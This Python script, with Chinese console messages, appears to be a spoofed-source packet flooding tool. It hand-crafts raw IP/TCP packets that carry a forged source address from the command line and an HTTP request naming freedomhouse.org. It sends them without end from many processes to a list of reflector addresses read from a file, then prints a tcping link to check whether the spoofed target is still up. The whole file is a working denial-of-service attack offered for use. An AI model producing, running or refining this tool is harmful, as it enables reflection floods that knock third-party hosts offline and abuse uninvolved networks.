import socket
import sys
import multiprocessing
import time

def packet(src_ip,dst_ip,src_port,dst_port):
    src_port = format(src_port, '04x')
    dst_port = format(dst_port, '04x')

    src_ip = [format(int(i), '02x') for i in src_ip.split(".")]
    src_ip = "".join(src_ip)

    dst_ip = [format(int(i), '02x') for i in dst_ip.split(".")]
    dst_ip = "".join(dst_ip)

    packet = f"450000520001000040062c2f{src_ip}{dst_ip}{src_port}{dst_port}000003e800000bb8501020000ef40000474554202f20485454502f312e310d0a486f73743a2066726565646f6d686f7573652e6f72670d0a0d0a"
    packet = bytes.fromhex(packet)
    return bytes(packet)


def start(packets,s):

    while True:
        for i in packets:
            s.sendto(i[0],(i[1],0))



if "__main__" == __name__:

    if len(sys.argv) < 5:
        print(f"错误: python3.8 {sys.argv[0]} ip port process time ref_file")
        exit()

    try:
        src_ip = sys.argv[1]
        src_port = int(sys.argv[2])
        process = int(sys.argv[3])
        time_ = int(sys.argv[4])
    except:
        print(f"错误: python3.8 {sys.argv[0]} ip port process ref_file")
        exit()


    try:
        file_path = sys.argv[5]
    except:
        file_path = "packet.txt"


    print(f"\n源IP地址:  {src_ip}")
    print(f"源端口  :  {src_port}")
    print(f"进程数  :  {process}")
    print(f"运行时间:  {time_} 秒")
    print(f"文件路径:  {file_path}")
    print(f"测试地址:  https://www.itdog.cn/tcping/{src_ip}:{src_port}")


    try:
        packets = []
        with open(file_path,'r',encoding='utf-8') as file:
            for i in file:
                i = i.strip().split(":")
                packets.append([packet(src_ip,i[0],src_port,int(i[1])),i[0]])
    except:
        print(f"错误: python3.8 {sys.argv[0]} ip port process ref_file")
        exit()

    procs = []

    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)

    for i in range(process):
        p = multiprocessing.Process(target=start,args=(packets,s))
        p.start()
        procs.append(p)
    

    try:
        time.sleep(time_)
    except:
        for i in procs:
            i.terminate()
            i.join()
        print("程序已退出")

    for i in procs:
        i.terminate()
        i.join()

    
    


